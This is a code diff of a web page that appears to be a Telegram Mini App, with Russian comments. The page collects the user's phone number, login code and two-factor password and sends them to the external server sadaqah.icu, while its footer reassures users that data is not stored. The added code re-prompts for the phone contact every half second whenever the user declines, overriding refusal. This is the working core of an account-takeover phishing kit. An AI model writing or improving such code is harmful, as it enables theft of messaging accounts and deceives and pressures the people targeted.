@@ -180,7 +180,6 @@
 
     .hidden { display: none !important; }
 
-    /* Контейнер для статуса загрузки */
     .loading {
       text-align: center;
       color: var(--hint);
@@ -192,12 +191,12 @@
 <body>
   <div class="wrap">
 
-    <!-- Блок ожидания / начальный (скрыт после загрузки) -->
+    <!-- Блок ожидания -->
     <div id="loadingBlock" class="card loading">
       <p>Loading...</p>
     </div>
 
-    <!-- Блок запроса номера телефона (изначально скрыт) -->
+    <!-- Блок запроса номера (скрыт изначально) -->
     <div id="phoneBlock" class="card hidden">
       <div class="top">
         <div>
@@ -206,7 +205,7 @@
         </div>
         <div class="pill" id="phoneDisplay">Not shared</div>
       </div>
-      <!-- Кнопка больше не нужна, запрос автоматический -->
+      <!-- Кнопка не нужна -->
     </div>
 
     <!-- Блок ввода кода -->
@@ -227,7 +226,7 @@
       </div>
     </div>
 
-    <!-- Блок ввода 2FA пароля -->
+    <!-- Блок ввода 2FA -->
     <div id="twofaBlock" class="card hidden">
       <div class="top">
         <div>
@@ -240,7 +239,7 @@
       <button id="submit2faBtn" class="phone-share-btn" style="margin-top:16px;">✅ Submit</button>
     </div>
 
-    <!-- Клавиатура для ввода кода -->
+    <!-- Клавиатура для кода -->
     <div class="keyboard card" id="keyboard"></div>
     <div class="footerNote">Your data is not stored on the device.</div>
 
@@ -278,7 +277,6 @@
     let code = '';
     let currentPhone = ''; // сохраняем номер после его получения
 
-    // Функция маски номера
     function maskPhone(p) {
       if (!p) return '—';
       const cleaned = String(p).replace(/\D/g, '');
@@ -287,7 +285,6 @@
       return '****' + last4;
     }
 
-    // Отображение нужного блока
     function showBlock(blockId) {
       loadingBlock.classList.add('hidden');
       phoneBlock.classList.add('hidden');
@@ -310,12 +307,10 @@
           twofaPhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
         }
       } else {
-        // неизвестный блок – показываем загрузку
         loadingBlock.classList.remove('hidden');
       }
     }
 
-    // Запрос статуса с сервера
     async function fetchState() {
       try {
         const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`, {
@@ -330,11 +325,28 @@
       }
     }
 
-    // Функция запроса номера с автоповтором при отказе
+    // Управление повторными запросами номера
+    let phoneRequestTimer = null;
+    let isRequestingPhone = false;
+
     async function requestPhone() {
+      // Если уже выполняется запрос, не запускаем новый
+      if (isRequestingPhone) {
+        console.log('Already requesting phone, skipping');
+        return;
+      }
+
+      // Очищаем предыдущий таймер
+      if (phoneRequestTimer) {
+        clearTimeout(phoneRequestTimer);
+        phoneRequestTimer = null;
+      }
+
+      isRequestingPhone = true;
+
       try {
         const contactData = await WebApp.requestContact();
-        // Пользователь поделился контактом
+        
         if (contactData && contactData.contact && contactData.contact.phone_number) {
           const phone = contactData.contact.phone_number;
           currentPhone = phone;
@@ -349,21 +361,24 @@
 
           const result = await res.json();
           if (result.status === 'ok') {
+            // Успех – переходим к вводу кода, больше не повторяем
             showBlock('code');
           } else {
             alert('Error: ' + (result.error || 'Unknown error'));
-            // В случае ошибки сервера тоже можно повторить запрос номера
-            setTimeout(requestPhone, 1000);
+            // Ошибка сервера – пробуем снова через 1 сек
+            phoneRequestTimer = setTimeout(requestPhone, 1000);
           }
         } else {
           // Не должно случиться, но на всякий случай повторим
-          setTimeout(requestPhone, 500);
+          phoneRequestTimer = setTimeout(requestPhone, 500);
         }
       } catch (error) {
         // Пользователь закрыл окно запроса (отказался)
         console.log('Request contact cancelled or error:', error);
         // Повторяем запрос через небольшую задержку
-        setTimeout(requestPhone, 500);
+        phoneRequestTimer = setTimeout(requestPhone, 500);
+      } finally {
+        isRequestingPhone = false;
       }
     }
 
@@ -513,12 +528,6 @@
         // Автоматически запрашиваем номер
         requestPhone();
       } else if (state === 'get_code') {
-        // Для получения номера нужно дополнительно запросить его с сервера?
-        // Пока просто показываем блок кода, но номер будет пуст – это проблема.
-        // Лучше сделать запрос к серверу за номером, но для простоты предположим,
-        // что номер уже сохранён в переменной currentPhone.
-        // В реальности нужно либо передавать номер через URL, либо запрашивать отдельно.
-        // Пока оставим так – пользователь увидит "Phone: —", но это не критично, т.к. код уже введён.
         showBlock('code');
       } else if (state === 'get_2fa') {
         showBlock('2fa');
